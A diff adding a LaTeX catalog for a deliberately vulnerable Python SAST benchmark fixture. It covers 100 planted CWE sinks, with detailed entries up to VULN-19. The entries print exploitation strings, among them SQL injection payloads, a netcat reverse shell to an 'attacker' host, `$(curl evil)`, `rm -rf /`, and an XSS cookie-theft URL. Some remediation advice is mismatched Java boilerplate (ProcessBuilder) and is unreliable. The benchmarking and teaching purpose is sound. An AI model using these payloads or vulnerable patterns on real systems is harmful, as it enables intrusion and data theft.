@@ -1,0 +1,1902 @@
+\documentclass[11pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage[margin=2.2cm]{geometry}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{longtable}
+\usepackage{booktabs}
+\usepackage{enumitem}
+\usepackage{fancyhdr}
+\usepackage[hidelinks]{hyperref}
+\definecolor{codebg}{RGB}{245,245,245}
+\definecolor{vulnred}{RGB}{155,20,20}
+\lstset{basicstyle=\ttfamily\small,breaklines=true,frame=single,backgroundcolor=\color{codebg},columns=fullflexible,keepspaces=true,showstringspaces=false,xleftmargin=4pt,framexleftmargin=4pt}
+\pagestyle{fancy}\fancyhf{}
+\lhead{Vulnerable Python App}\rhead{SAST Reference Catalog}
+\cfoot{\thepage}
+\title{\textbf{Vulnerable Python App}\\[4pt]\large Planted Vulnerability Reference \& Exploitation Guide}
+\author{SAST Benchmark Fixture}
+\date{\today}
+\begin{document}
+\maketitle
+\begin{center}\fbox{\parbox{0.9\textwidth}{\centering\bfseries WARNING: This project is intentionally vulnerable. Never deploy, run, or expose it in any real environment. It exists only to benchmark SAST tools.}}\end{center}
+\vspace{6pt}
+\tableofcontents
+\newpage
+\section{Overview}
+This catalog documents the \textbf{100} vulnerabilities planted across \textbf{74} unique CWE classes in this fixture. Each entry gives the location (as recorded in \texttt{reference.sarif}), the planted sink, a plain-language explanation, concrete exploitation variants, and remediation. Every sink is marked in-source with a \texttt{\# VULN-XX} comment.
+\section{Summary table}
+\renewcommand{\arraystretch}{1.15}
+\begin{longtable}{@{}l l l r l@{}}
+\toprule \textbf{ID} & \textbf{CWE} & \textbf{File} & \textbf{Line} & \textbf{Sev} \\ \midrule \endhead
+VULN-01 & CWE-89 & \texttt{injection\_vulns.py} & 18 & 8.0 \\
+VULN-02 & CWE-89 & \texttt{injection\_vulns.py} & 26 & 8.0 \\
+VULN-03 & CWE-89 & \texttt{injection\_vulns.py} & 33 & 8.0 \\
+VULN-04 & CWE-78 & \texttt{injection\_vulns.py} & 39 & 8.0 \\
+VULN-05 & CWE-78 & \texttt{injection\_vulns.py} & 44 & 8.0 \\
+VULN-06 & CWE-78 & \texttt{injection\_vulns.py} & 50 & 8.0 \\
+VULN-07 & CWE-95 & \texttt{injection\_vulns.py} & 55 & 8.0 \\
+VULN-08 & CWE-95 & \texttt{injection\_vulns.py} & 60 & 8.0 \\
+VULN-09 & CWE-90 & \texttt{injection\_vulns.py} & 65 & 8.0 \\
+VULN-10 & CWE-943 & \texttt{injection\_vulns.py} & 70 & 8.0 \\
+VULN-11 & CWE-1333 & \texttt{injection\_vulns.py} & 75 & 8.0 \\
+VULN-12 & CWE-79 & \texttt{web\_vulns.py} & 12 & 8.0 \\
+VULN-13 & CWE-79 & \texttt{web\_vulns.py} & 18 & 8.0 \\
+VULN-14 & CWE-1336 & \texttt{web\_vulns.py} & 23 & 8.0 \\
+VULN-15 & CWE-601 & \texttt{web\_vulns.py} & 28 & 8.0 \\
+VULN-16 & CWE-113 & \texttt{web\_vulns.py} & 34 & 8.0 \\
+VULN-17 & CWE-614 & \texttt{web\_vulns.py} & 40 & 8.0 \\
+VULN-18 & CWE-942 & \texttt{web\_vulns.py} & 46 & 8.0 \\
+VULN-19 & CWE-1021 & \texttt{web\_vulns.py} & 53 & 8.0 \\
+VULN-20 & CWE-22 & \texttt{file\_network\_vulns.py} & 17 & 8.0 \\
+VULN-21 & CWE-22 & \texttt{file\_network\_vulns.py} & 23 & 8.0 \\
+VULN-22 & CWE-918 & \texttt{file\_network\_vulns.py} & 29 & 8.0 \\
+VULN-23 & CWE-22 & \texttt{file\_network\_vulns.py} & 35 & 8.0 \\
+VULN-24 & CWE-377 & \texttt{file\_network\_vulns.py} & 41 & 8.0 \\
+VULN-25 & CWE-732 & \texttt{file\_network\_vulns.py} & 49 & 8.0 \\
+VULN-26 & CWE-502 & \texttt{file\_network\_vulns.py} & 54 & 8.0 \\
+VULN-27 & CWE-798 & \texttt{crypto\_secret\_vulns.py} & 11 & 8.0 \\
+VULN-28 & CWE-798 & \texttt{crypto\_secret\_vulns.py} & 13 & 8.0 \\
+VULN-29 & CWE-259 & \texttt{crypto\_secret\_vulns.py} & 15 & 8.0 \\
+VULN-30 & CWE-327 & \texttt{crypto\_secret\_vulns.py} & 20 & 8.0 \\
+VULN-31 & CWE-327 & \texttt{crypto\_secret\_vulns.py} & 25 & 8.0 \\
+VULN-32 & CWE-327 & \texttt{crypto\_secret\_vulns.py} & 31 & 8.0 \\
+VULN-33 & CWE-327 & \texttt{crypto\_secret\_vulns.py} & 38 & 8.0 \\
+VULN-34 & CWE-329 & \texttt{crypto\_secret\_vulns.py} & 46 & 8.0 \\
+VULN-35 & CWE-330 & \texttt{crypto\_secret\_vulns.py} & 52 & 8.0 \\
+VULN-36 & CWE-337 & \texttt{crypto\_secret\_vulns.py} & 57 & 8.0 \\
+VULN-37 & CWE-759 & \texttt{crypto\_secret\_vulns.py} & 63 & 8.0 \\
+VULN-38 & CWE-306 & \texttt{auth\_api\_vulns.py} & 17 & 8.0 \\
+VULN-39 & CWE-639 & \texttt{auth\_api\_vulns.py} & 23 & 8.0 \\
+VULN-40 & CWE-269 & \texttt{auth\_api\_vulns.py} & 28 & 8.0 \\
+VULN-41 & CWE-256 & \texttt{auth\_api\_vulns.py} & 34 & 8.0 \\
+VULN-42 & CWE-326 & \texttt{auth\_api\_vulns.py} & 39 & 8.0 \\
+VULN-43 & CWE-287 & \texttt{auth\_api\_vulns.py} & 44 & 8.0 \\
+VULN-44 & CWE-521 & \texttt{auth\_api\_vulns.py} & 49 & 8.0 \\
+VULN-45 & CWE-208 & \texttt{auth\_api\_vulns.py} & 54 & 8.0 \\
+VULN-46 & CWE-347 & \texttt{auth\_api\_vulns.py} & 60 & 8.0 \\
+VULN-47 & CWE-798 & \texttt{auth\_api\_vulns.py} & 66 & 8.0 \\
+VULN-48 & CWE-307 & \texttt{auth\_api\_vulns.py} & 71 & 8.0 \\
+VULN-49 & CWE-209 & \texttt{auth\_api\_vulns.py} & 81 & 8.0 \\
+VULN-50 & CWE-611 & \texttt{data\_config\_vulns.py} & 20 & 8.0 \\
+VULN-51 & CWE-502 & \texttt{data\_config\_vulns.py} & 25 & 8.0 \\
+VULN-52 & CWE-470 & \texttt{data\_config\_vulns.py} & 31 & 8.0 \\
+VULN-53 & CWE-117 & \texttt{data\_config\_vulns.py} & 37 & 8.0 \\
+VULN-54 & CWE-532 & \texttt{data\_config\_vulns.py} & 42 & 8.0 \\
+VULN-55 & CWE-295 & \texttt{data\_config\_vulns.py} & 50 & 8.0 \\
+VULN-56 & CWE-327 & \texttt{data\_config\_vulns.py} & 56 & 8.0 \\
+VULN-57 & CWE-489 & \texttt{data\_config\_vulns.py} & 61 & 8.0 \\
+VULN-58 & CWE-312 & \texttt{data\_config\_vulns.py} & 66 & 8.0 \\
+VULN-59 & CWE-20 & \texttt{data\_config\_vulns.py} & 72 & 8.0 \\
+VULN-60 & CWE-434 & \texttt{data\_config\_vulns.py} & 78 & 8.0 \\
+VULN-61 & CWE-89 & \texttt{advanced\_injection\_vulns.py} & 20 & 8.0 \\
+VULN-62 & CWE-89 & \texttt{advanced\_injection\_vulns.py} & 27 & 8.0 \\
+VULN-63 & CWE-88 & \texttt{advanced\_injection\_vulns.py} & 33 & 8.0 \\
+VULN-64 & CWE-917 & \texttt{advanced\_injection\_vulns.py} & 38 & 8.0 \\
+VULN-65 & CWE-643 & \texttt{advanced\_injection\_vulns.py} & 43 & 8.0 \\
+VULN-66 & CWE-93 & \texttt{advanced\_injection\_vulns.py} & 48 & 8.0 \\
+VULN-67 & CWE-79 & \texttt{advanced\_injection\_vulns.py} & 55 & 8.0 \\
+VULN-68 & CWE-116 & \texttt{advanced\_injection\_vulns.py} & 61 & 8.0 \\
+VULN-69 & CWE-134 & \texttt{advanced\_injection\_vulns.py} & 67 & 8.0 \\
+VULN-70 & CWE-915 & \texttt{advanced\_injection\_vulns.py} & 72 & 8.0 \\
+VULN-71 & CWE-601 & \texttt{advanced\_injection\_vulns.py} & 79 & 8.0 \\
+VULN-72 & CWE-918 & \texttt{advanced\_injection\_vulns.py} & 86 & 8.0 \\
+VULN-73 & CWE-776 & \texttt{advanced\_injection\_vulns.py} & 93 & 8.0 \\
+VULN-74 & CWE-1275 & \texttt{advanced\_injection\_vulns.py} & 99 & 8.0 \\
+VULN-75 & CWE-352 & \texttt{advanced\_injection\_vulns.py} & 105 & 8.0 \\
+VULN-76 & CWE-644 & \texttt{advanced\_injection\_vulns.py} & 111 & 8.0 \\
+VULN-77 & CWE-601 & \texttt{advanced\_injection\_vulns.py} & 117 & 8.0 \\
+VULN-78 & CWE-78 & \texttt{advanced\_injection\_vulns.py} & 123 & 8.0 \\
+VULN-79 & CWE-1336 & \texttt{advanced\_injection\_vulns.py} & 129 & 8.0 \\
+VULN-80 & CWE-1333 & \texttt{advanced\_injection\_vulns.py} & 134 & 8.0 \\
+VULN-81 & CWE-367 & \texttt{concurrency\_misc\_vulns.py} & 21 & 8.0 \\
+VULN-82 & CWE-362 & \texttt{concurrency\_misc\_vulns.py} & 29 & 8.0 \\
+VULN-83 & CWE-772 & \texttt{concurrency\_misc\_vulns.py} & 35 & 8.0 \\
+VULN-84 & CWE-772 & \texttt{concurrency\_misc\_vulns.py} & 42 & 8.0 \\
+VULN-85 & CWE-789 & \texttt{concurrency\_misc\_vulns.py} & 49 & 8.0 \\
+VULN-86 & CWE-190 & \texttt{concurrency\_misc\_vulns.py} & 56 & 8.0 \\
+VULN-87 & CWE-835 & \texttt{concurrency\_misc\_vulns.py} & 62 & 8.0 \\
+VULN-88 & CWE-369 & \texttt{concurrency\_misc\_vulns.py} & 70 & 8.0 \\
+VULN-89 & CWE-476 & \texttt{concurrency\_misc\_vulns.py} & 76 & 8.0 \\
+VULN-90 & CWE-617 & \texttt{concurrency\_misc\_vulns.py} & 82 & 8.0 \\
+VULN-91 & CWE-597 & \texttt{concurrency\_misc\_vulns.py} & 88 & 8.0 \\
+VULN-92 & CWE-798 & \texttt{concurrency\_misc\_vulns.py} & 93 & 8.0 \\
+VULN-93 & CWE-548 & \texttt{concurrency\_misc\_vulns.py} & 98 & 8.0 \\
+VULN-94 & CWE-200 & \texttt{concurrency\_misc\_vulns.py} & 104 & 8.0 \\
+VULN-95 & CWE-501 & \texttt{concurrency\_misc\_vulns.py} & 110 & 8.0 \\
+VULN-96 & CWE-345 & \texttt{concurrency\_misc\_vulns.py} & 116 & 8.0 \\
+VULN-97 & CWE-681 & \texttt{concurrency\_misc\_vulns.py} & 122 & 8.0 \\
+VULN-98 & CWE-602 & \texttt{concurrency\_misc\_vulns.py} & 127 & 8.0 \\
+VULN-99 & CWE-478 & \texttt{concurrency\_misc\_vulns.py} & 135 & 8.0 \\
+VULN-100 & CWE-598 & \texttt{concurrency\_misc\_vulns.py} & 143 & 8.0 \\
+\bottomrule \end{longtable}
+\section{Vulnerability details}
+\subsection{VULN-01: CWE-89: SQL Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 18 \quad \textbf{Rule:} \texttt{python/sql-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/89.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+cur.execute("SELECT * FROM users WHERE id = '" + user_id + "'")
+\end{lstlisting}
+\noindent\textbf{What it is.} SQL injection: untrusted input is concatenated into a SQL query string.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Auth bypass: `' OR '1'='1` in a login field.
+\item Data exfiltration via UNION: `' UNION SELECT username,password FROM users--`.
+\item Blind/time-based extraction with `SLEEP()`/`WAITFOR`; stacked queries for write/DROP.
+\end{itemize}
+\noindent\textbf{Remediation.} Use parameterized queries / PreparedStatement; never build SQL by string concatenation.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-02: CWE-89: SQL Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 26 \quad \textbf{Rule:} \texttt{python/sql-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/89.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+cur.execute(q)
+\end{lstlisting}
+\noindent\textbf{What it is.} SQL injection: untrusted input is concatenated into a SQL query string.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Auth bypass: `' OR '1'='1` in a login field.
+\item Data exfiltration via UNION: `' UNION SELECT username,password FROM users--`.
+\item Blind/time-based extraction with `SLEEP()`/`WAITFOR`; stacked queries for write/DROP.
+\end{itemize}
+\noindent\textbf{Remediation.} Use parameterized queries / PreparedStatement; never build SQL by string concatenation.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-03: CWE-89: SQL Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 33 \quad \textbf{Rule:} \texttt{python/sql-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/89.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+cur.execute(f"UPDATE users SET role='{role}' WHERE id={uid}")
+\end{lstlisting}
+\noindent\textbf{What it is.} SQL injection: untrusted input is concatenated into a SQL query string.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Auth bypass: `' OR '1'='1` in a login field.
+\item Data exfiltration via UNION: `' UNION SELECT username,password FROM users--`.
+\item Blind/time-based extraction with `SLEEP()`/`WAITFOR`; stacked queries for write/DROP.
+\end{itemize}
+\noindent\textbf{Remediation.} Use parameterized queries / PreparedStatement; never build SQL by string concatenation.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-04: CWE-78: OS Command Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 39 \quad \textbf{Rule:} \texttt{python/os-command-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/78.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+os.system("ping -c 1 " + host)
+\end{lstlisting}
+\noindent\textbf{What it is.} OS command injection: untrusted input is concatenated into a shell/command invocation.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject shell metacharacters: `; rm -rf /`, `| nc attacker 4444 -e /bin/sh`, `\$(curl evil)`.
+\item Use `\&\&`, `||`, backticks or `\$()` to chain arbitrary commands.
+\item On `Runtime.exec(String)` the string is split naively, so spaces/quotes can be abused.
+\end{itemize}
+\noindent\textbf{Remediation.} Avoid the shell; use ProcessBuilder with an argument array and a fixed command, validate arguments.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-05: CWE-78: OS Command Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 44 \quad \textbf{Rule:} \texttt{python/os-command-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/78.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return subprocess.check_output("cat " + filename, shell=True)
+\end{lstlisting}
+\noindent\textbf{What it is.} OS command injection: untrusted input is concatenated into a shell/command invocation.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject shell metacharacters: `; rm -rf /`, `| nc attacker 4444 -e /bin/sh`, `\$(curl evil)`.
+\item Use `\&\&`, `||`, backticks or `\$()` to chain arbitrary commands.
+\item On `Runtime.exec(String)` the string is split naively, so spaces/quotes can be abused.
+\end{itemize}
+\noindent\textbf{Remediation.} Avoid the shell; use ProcessBuilder with an argument array and a fixed command, validate arguments.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-06: CWE-78: OS Command Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 50 \quad \textbf{Rule:} \texttt{python/os-command-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/78.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return os.popen(cmd).read()
+\end{lstlisting}
+\noindent\textbf{What it is.} OS command injection: untrusted input is concatenated into a shell/command invocation.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject shell metacharacters: `; rm -rf /`, `| nc attacker 4444 -e /bin/sh`, `\$(curl evil)`.
+\item Use `\&\&`, `||`, backticks or `\$()` to chain arbitrary commands.
+\item On `Runtime.exec(String)` the string is split naively, so spaces/quotes can be abused.
+\end{itemize}
+\noindent\textbf{Remediation.} Avoid the shell; use ProcessBuilder with an argument array and a fixed command, validate arguments.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-07: CWE-95: Code Injection (eval/exec)}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 55 \quad \textbf{Rule:} \texttt{python/code-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/95.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return eval(expr)
+\end{lstlisting}
+\noindent\textbf{What it is.} Eval injection: untrusted input is passed to a dynamic-evaluation primitive (eval/exec/compile), so the attacker's data is executed as code.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Supply `\_\_import\_\_('os').system('id')` to run arbitrary OS commands.
+\item Use `().\_\_class\_\_.\_\_bases\_\_[0].\_\_subclasses\_\_()` gadget chains to escape restricted eval namespaces.
+\item Read/exfiltrate secrets: `open('/etc/passwd').read()` inside the evaluated expression.
+\end{itemize}
+\noindent\textbf{Remediation.} Never eval/exec untrusted input. Parse with ast.literal\_eval for data, or use an explicit allow-listed dispatch table.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-08: CWE-95: Code Injection (eval/exec)}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 60 \quad \textbf{Rule:} \texttt{python/code-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/95.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+exec(src)
+\end{lstlisting}
+\noindent\textbf{What it is.} Eval injection: untrusted input is passed to a dynamic-evaluation primitive (eval/exec/compile), so the attacker's data is executed as code.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Supply `\_\_import\_\_('os').system('id')` to run arbitrary OS commands.
+\item Use `().\_\_class\_\_.\_\_bases\_\_[0].\_\_subclasses\_\_()` gadget chains to escape restricted eval namespaces.
+\item Read/exfiltrate secrets: `open('/etc/passwd').read()` inside the evaluated expression.
+\end{itemize}
+\noindent\textbf{Remediation.} Never eval/exec untrusted input. Parse with ast.literal\_eval for data, or use an explicit allow-listed dispatch table.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-09: CWE-90: LDAP Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 65 \quad \textbf{Rule:} \texttt{python/ldap-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/90.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return conn.search_s("ou=users,dc=example,dc=com", 2, "(uid=" + username + ")")
+\end{lstlisting}
+\noindent\textbf{What it is.} LDAP injection: untrusted input is placed into an LDAP filter unescaped.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject `*)(uid=*))(|(uid=*` to broaden the filter and enumerate/bypass auth.
+\item Use `*` wildcards to match all entries; blind extraction of attribute values.
+\end{itemize}
+\noindent\textbf{Remediation.} Escape LDAP special chars per RFC 4515 or use parameterized LDAP APIs; validate input.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-10: CWE-943: NoSQL Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 70 \quad \textbf{Rule:} \texttt{python/nosql-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/943.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return collection.find({"$where": "this.name == '" + username + "'"})
+\end{lstlisting}
+\noindent\textbf{What it is.} NoSQL injection: input concatenated/embedded into a NoSQL query/object.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject operator objects like `\{"\$ne": null\}` / `\{"\$gt":""\}` to bypass auth or dump data.
+\item Use `\$where` with JS for server-side evaluation.
+\end{itemize}
+\noindent\textbf{Remediation.} Use typed query builders/parameterization; reject operator objects from input.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-11: CWE-1333: Inefficient Regular Expression (ReDoS)}
+\noindent\textbf{Location:} \texttt{src/vulnapp/injection\_vulns.py}, line 75 \quad \textbf{Rule:} \texttt{python/redos} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/1333.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return re.match(user_pattern, text)
+\end{lstlisting}
+\noindent\textbf{What it is.} Inefficient regex enabling ReDoS (catastrophic backtracking).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send crafted input that makes the regex backtrack exponentially, pinning CPU (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Use linear-time regex/engines, bound input, avoid nested quantifiers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-12: CWE-79: Cross-Site Scripting}
+\noindent\textbf{Location:} \texttt{src/vulnapp/web\_vulns.py}, line 12 \quad \textbf{Rule:} \texttt{python/cross-site-scripting} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/79.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return Response("<h1>Hello " + name + "</h1>", mimetype="text/html")
+\end{lstlisting}
+\noindent\textbf{What it is.} Cross-site scripting: untrusted input is reflected into HTML/JS without encoding.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Reflected: `?q=<script>document.location='//evil/'+document.cookie</script>` to steal sessions.
+\item Use event handlers/`<img onerror>` when `<script>` is filtered.
+\item Escalate to keylogging, CSRF token theft, or full account takeover.
+\end{itemize}
+\noindent\textbf{Remediation.} Context-aware output encoding (HTML/attr/JS/URL); use a template engine that auto-escapes and set CSP.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-13: CWE-79: Cross-Site Scripting}
+\noindent\textbf{Location:} \texttt{src/vulnapp/web\_vulns.py}, line 18 \quad \textbf{Rule:} \texttt{python/cross-site-scripting} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/79.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return Response(html, mimetype="text/html")
+\end{lstlisting}
+\noindent\textbf{What it is.} Cross-site scripting: untrusted input is reflected into HTML/JS without encoding.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Reflected: `?q=<script>document.location='//evil/'+document.cookie</script>` to steal sessions.
+\item Use event handlers/`<img onerror>` when `<script>` is filtered.
+\item Escalate to keylogging, CSRF token theft, or full account takeover.
+\end{itemize}
+\noindent\textbf{Remediation.} Context-aware output encoding (HTML/attr/JS/URL); use a template engine that auto-escapes and set CSP.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-14: CWE-1336: Server-Side Template Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/web\_vulns.py}, line 23 \quad \textbf{Rule:} \texttt{python/server-side-template-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/1336.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return render_template_string("Hello " + template_src)
+\end{lstlisting}
+\noindent\textbf{What it is.} Server-Side Template Injection: input becomes part of a template.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject template syntax (`\$\{7*7\}`, `\#\{...\}`) that the engine evaluates, often to RCE.
+\end{itemize}
+\noindent\textbf{Remediation.} Never render user input as template source; pass it as data only.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-15: CWE-601: Open Redirect}
+\noindent\textbf{Location:} \texttt{src/vulnapp/web\_vulns.py}, line 28 \quad \textbf{Rule:} \texttt{python/open-redirect} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/601.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return redirect(target)
+\end{lstlisting}
+\noindent\textbf{What it is.} Open redirect: redirect target comes from user input.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Craft `?next=//evil.com` links for phishing that appear to originate from the trusted site.
+\end{itemize}
+\noindent\textbf{Remediation.} Allow-list redirect targets or use relative paths only.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-16: CWE-113: HTTP Response Splitting}
+\noindent\textbf{Location:} \texttt{src/vulnapp/web\_vulns.py}, line 34 \quad \textbf{Rule:} \texttt{python/http-response-splitting} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/113.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.headers["Location"] = location
+\end{lstlisting}
+\noindent\textbf{What it is.} HTTP response splitting: CRLF in input used to build a response header.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject `\%0d\%0aSet-Cookie: session=attacker` to fixate sessions.
+\item Split off a second, attacker-controlled response body (cache poisoning / XSS).
+\end{itemize}
+\noindent\textbf{Remediation.} Reject CR/LF in header values; use framework APIs that encode headers safely.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-17: CWE-614: Sensitive Cookie Without Secure/HttpOnly}
+\noindent\textbf{Location:} \texttt{src/vulnapp/web\_vulns.py}, line 40 \quad \textbf{Rule:} \texttt{python/sensitive-cookie-without-secure-httponly} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/614.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.set_cookie("session", session_id, secure=False, httponly=False)
+\end{lstlisting}
+\noindent\textbf{What it is.} Sensitive cookie set without Secure/HttpOnly flags.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Steal the cookie via XSS (no HttpOnly) or over HTTP (no Secure).
+\end{itemize}
+\noindent\textbf{Remediation.} Set Secure, HttpOnly and SameSite on session cookies.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-18: CWE-942: Overly Permissive CORS}
+\noindent\textbf{Location:} \texttt{src/vulnapp/web\_vulns.py}, line 46 \quad \textbf{Rule:} \texttt{python/permissive-cors} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/942.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.headers["Access-Control-Allow-Origin"] = "*"
+\end{lstlisting}
+\noindent\textbf{What it is.} Overly permissive CORS (wildcard/reflected origin with credentials).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Malicious site reads authenticated responses cross-origin, exfiltrating data.
+\end{itemize}
+\noindent\textbf{Remediation.} Allow-list specific origins; never combine `*` with credentials.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-19: CWE-1021: Missing Anti-Clickjacking Header}
+\noindent\textbf{Location:} \texttt{src/vulnapp/web\_vulns.py}, line 53 \quad \textbf{Rule:} \texttt{python/clickjacking} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/1021.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.headers["Content-Type"] = "text/html"
+\end{lstlisting}
+\noindent\textbf{What it is.} Missing anti-framing protection (clickjacking).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Frame the site and trick users into clicking hidden actions (UI redress).
+\end{itemize}
+\noindent\textbf{Remediation.} Set X-Frame-Options: DENY / CSP frame-ancestors.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-20: CWE-22: Path Traversal}
